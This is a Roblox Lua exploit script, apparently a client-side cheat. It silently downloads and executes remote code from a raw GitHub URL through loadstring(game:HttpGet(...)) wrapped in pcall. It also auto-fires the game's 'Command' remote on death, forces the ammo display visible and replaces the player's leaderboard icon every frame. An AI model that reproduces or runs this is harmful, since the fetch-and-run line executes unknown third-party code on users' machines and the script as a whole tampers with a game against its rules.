local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local userIdStr = tostring(player.UserId)
local replacementImageId = "rbxassetid://129854062749730"

pcall(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/NMCJSSB2/114514/refs/heads/main/FPS'))()
end)

local function getAmmoFrame()
	local pg = player:FindFirstChild("PlayerGui")
	local gunOverlay = pg and pg:FindFirstChild("GunOverlay") and pg.GunOverlay:FindFirstChild("ScreenSize")
	return gunOverlay and gunOverlay:FindFirstChild("AmmoFrame")
end

local function getProfileIcon()
	local pg = player:FindFirstChild("PlayerGui")
	local lb = pg and pg:FindFirstChild("LeaderboardGui")
	local main = lb and lb:FindFirstChild("MainFrame")
	local userFrame = main and main:FindFirstChild(userIdStr)
	return userFrame and userFrame:FindFirstChild("ProfileIcon")
end

player.CharacterAdded:Connect(function(char)
	local humanoid = char:WaitForChild("Humanoid", 5)
	if humanoid then
		humanoid.Died:Connect(function()
			local commandRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Command")
			commandRemote:FireServer("Play")
		end)
	end
end)

RunService.Heartbeat:Connect(function()
	local ammoFrame = getAmmoFrame()
	if ammoFrame and ammoFrame:IsA("GuiObject") then
		ammoFrame.Visible = true
	end

	local profileIcon = getProfileIcon()
	if profileIcon and profileIcon:IsA("ImageLabel") then
		profileIcon.Image = replacementImageId
	end
end)
